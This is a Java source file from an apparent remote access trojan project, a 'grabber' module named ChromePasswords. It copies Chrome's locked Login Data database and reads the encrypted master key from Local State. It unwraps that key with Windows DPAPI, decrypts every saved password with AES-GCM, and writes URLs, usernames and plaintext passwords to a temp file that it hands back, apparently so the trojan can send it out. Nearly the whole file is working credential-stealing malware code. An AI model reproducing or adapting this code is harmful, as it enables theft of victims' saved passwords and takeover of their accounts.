package in.momin5.projectRAT.request.grabbers;

import com.sun.jna.platform.win32.Crypt32Util;
import in.momin5.projectRAT.request.Request;
import org.json.simple.JSONObject;
import org.json.simple.parser.JSONParser;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Random;

public class ChromePasswords implements Request {

    File infoDumpFile;

    @Override
    public void init() throws Exception {
        ArrayList<String> list = getChromePass();
        infoDumpFile = new File(System.getProperty("java.io.tmpdir") + "/" + new Random().nextInt() + ".txt");
        FileOutputStream dumpStream = new FileOutputStream(infoDumpFile);
        for(String s: list){
            dumpStream.write(s.getBytes());
            dumpStream.write("\n".getBytes());
        }
        dumpStream.flush();
        dumpStream.close();
        infoDumpFile.deleteOnExit();
    }

    @Override
    public String getMessage() {
        return null;
    }

    @Override
    public File[] getFiles() {
        return new File[]{
                infoDumpFile
        };
    }

    private ArrayList<String> getChromePass(){
        ArrayList<String> info = new ArrayList<>();
        Connection conn = null;
        Statement statement = null;

        try {
            //Chrome locks its DATABASE file when its running, so we cant access it unless we copy it temporary and THEN access it

            String loginDataFile = System.getProperty("user.home") + "/Appdata/Local/Google/Chrome/User Data/Default/Login Data";
            String finalDestination = System.getProperty("java.io.tmpdir") + "Data";
            File finalDestinationFile = new File(finalDestination);
            if(finalDestinationFile.exists())
                finalDestinationFile.delete();
            FileInputStream in = new FileInputStream(loginDataFile);
            FileOutputStream out = new FileOutputStream(finalDestinationFile);
            int n;
            while ((n = in.read()) != -1){
                out.write(n);
            }
            in.close();
            out.close();
            finalDestinationFile.deleteOnExit();
            String stmt = "jdbc:sqlite:" + finalDestination;
            conn = DriverManager.getConnection(stmt);

            statement = conn.createStatement();
            ResultSet rs = statement.executeQuery("SELECT * FROM logins;");
            while (rs.next()){
                String url = rs.getString("action_url");
                if(url == null) url = "URL not found";
                String username = rs.getString("username_value");
                if(username == null) username = "Username not found";
                //InputStream passwordHashStream = rs.getBinaryStream("password_value");
                byte[] encpass = rs.getBytes("password_value");
                info.add(String.format("URL: %s USERNAME: %s Password: %s",url,username, getDecryptedValue(encpass)));
            }
            rs.close();
            statement.close();
            conn.close();

        }catch (Exception ignored){
        }

        return info;
    }

    private String getDecryptedValue(byte[] data) throws Exception {
        String pathLocalState = System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Local State";
        JSONObject jsonObject = (JSONObject) new JSONParser().parse(new FileReader(pathLocalState));
        String encryptedMasterKeyB64 = (String) ((JSONObject) jsonObject.get("os_crypt")).get("encrypted_key");

        byte[] encryptedMKWithPrefix = Base64.getDecoder().decode(encryptedMasterKeyB64);
        byte[] encryptedMasterKey = Arrays.copyOfRange(encryptedMKWithPrefix, 5, encryptedMKWithPrefix.length);

        byte[] masterKey = Crypt32Util.cryptUnprotectData(encryptedMasterKey);

        byte[] nonce = Arrays.copyOfRange(data, 3, 3 + 12);
        byte[] ciphertextTag = Arrays.copyOfRange(data, 3 + 12, data.length);

        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        GCMParameterSpec gcmParameterSpec = new GCMParameterSpec(128, nonce);
        SecretKeySpec keySpec = new SecretKeySpec(masterKey, "AES");
        cipher.init(Cipher.DECRYPT_MODE, keySpec, gcmParameterSpec);
        byte[] password = cipher.doFinal(ciphertextTag);

        return new String(password, StandardCharsets.UTF_8);
    }

}
